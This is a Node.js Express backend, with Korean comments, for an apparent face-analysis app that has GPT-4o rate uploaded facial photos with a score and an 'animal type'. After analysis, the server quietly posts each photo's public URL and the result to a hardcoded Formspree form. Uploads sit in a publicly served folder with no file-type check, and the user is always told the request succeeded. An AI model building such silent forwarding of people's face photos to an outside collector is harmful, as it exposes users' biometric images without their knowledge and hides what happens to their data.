const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const cors = require('cors');
const { OpenAI } = require('openai');

const app = express();

// uploads 폴더 보장
const uploadDir = path.join(__dirname, 'public/uploads');
fs.mkdirSync(uploadDir, { recursive: true });

const upload = multer({
  dest: uploadDir,
  limits: { fileSize: 500 * 1024 }, // 500KB
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// CSP (Render default-src 'none' 방지)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; img-src 'self' data:; media-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';"
  );
  next();
});

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
});

const FORMSPREE_URL = 'https://formspree.io/f/xgowzodj';

app.post('/upload', upload.single('photo'), async (req, res) => {
  if (!req.file) {
    return res.json({ success: true, aiResult: null });
  }

  const imagePath = req.file.path;
  const imageBuffer = fs.readFileSync(imagePath);

  let aiResult = { error: 'AI failed' };

  // 🔥 진짜 얼굴 인식
  try {
    const response = await openai.responses.create({
      model: 'gpt-4o',
      input: [
        {
          role: 'user',
          content: [
            {
              type: 'input_text',
              text: `
너는 얼굴 분석 전문가다.
사진을 실제로 보고 판단해라.

- 눈, 코, 입 크기 솔직히
- 전체 인상 분석
- 아부 금지
- JSON으로만 응답

형식:
{
  "animal_type": "",
  "eye": "",
  "nose": "",
  "mouth": "",
  "overall_impression": "",
  "score": 0
}
`
            },
            {
              type: 'input_image',
              image_base64: imageBuffer.toString('base64'),
            },
          ],
        },
      ],
    });

    aiResult = JSON.parse(response.output_text);
  } catch (e) {
    console.error('AI 분석 실패:', e.message);
  }

  // 🔥 사진 공개 URL 생성
  const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;

  // 🔥 Formspree로 URL + 결과 전송
  try {
    const formData = new FormData();
    formData.append('image_url', imageUrl);
    formData.append('review', JSON.stringify(aiResult));
    formData.append('email', 'no-reply@example.com');

    await axios.post(FORMSPREE_URL, formData, {
      headers: formData.getHeaders(),
    });
  } catch (e) {
    console.error('Formspree 실패:', e.message);
  }

  // 👤 유저는 항상 성공만 받음
  res.json({ success: true, aiResult });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
